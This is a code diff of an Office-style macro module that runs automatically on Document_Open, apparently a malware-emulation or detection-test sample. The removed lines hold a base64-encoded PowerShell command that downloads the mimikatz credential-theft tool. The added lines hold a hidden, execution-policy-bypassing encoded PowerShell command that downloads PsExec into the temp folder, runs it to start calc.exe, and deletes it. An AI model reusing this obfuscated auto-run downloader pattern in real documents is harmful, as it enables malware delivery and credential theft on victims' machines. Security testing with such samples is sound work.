@@ -11,15 +11,12 @@ Module Program
 
     Sub mrrobot()
 
-        Dim elliot
-        elliot = "cG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1FeGVjdXRpb25Qb2xpY3kgdW5yZXN0cmljdGVkIC1Db21tYW5kICJbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJd" _
-        & "OjpTZWN1cml0eVByb3RvY29sID0gW05ldC5TZWN1cml0eVByb3RvY29sVHlwZV06OlRsczEyOyBJbnZva2UtV2ViUmVxdWVzdCAtT3V0RmlsZSAnd2hpdGVyb3NlLmV" _
-        & "4ZScgLXVzZWIgJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9QYXJyb3RTZWMvbWltaWthdHovbWFzdGVyL1dpbjMyL21pbWlrYXR6LmV4ZSci"
-
         Dim darlene
-        darlene = "C:\Windows\System32\cmd.exe /k " + db64(elliot)
+        darlene = "powershell.exe -nop -win hid -exec bypass -encodedcommand JFByb2dyZXNzUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJzsgSW52b" _
+        & "2tlLVdlYlJlcXVlc3QgLVVSSSBodHRwczovL2xpdmUuc3lzaW50ZXJuYWxzLmNvbS9Qc0V4ZWM2NC5leGUgLU91dCAkZW52OnRlbXBccHNleGVjLmV4ZTsgU3RhcnQtUH" _
+        & "JvY2VzcyAkZW52OnRlbXBccHNleGVjLmV4ZSAtQXJndW1lbnRMaXN0ICJDOlxXaW5kb3dzXFN5c3RlbTMyXGNhbGMuZXhlIiAtTm9OZXdXaW5kb3cgLVdhaXQ7IGRlbCA" _
+        & "kZW52OnRlbXBccHNleGVjLmV4ZQ=="
 
-        'Realizamos una descarga con bitsadmin de un ejecutable sospechoso
         Dim shell
         Dim out
         shell = VBA.CreateObject("WScript.Shell")
@@ -34,11 +31,5 @@ Module Program
     Sub Document_Open()
         mrrobot()
     End Sub
-
-    Public Function db64(input As String) As String
-        Return System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(input))
-    End Function
-
-
 
 End Module
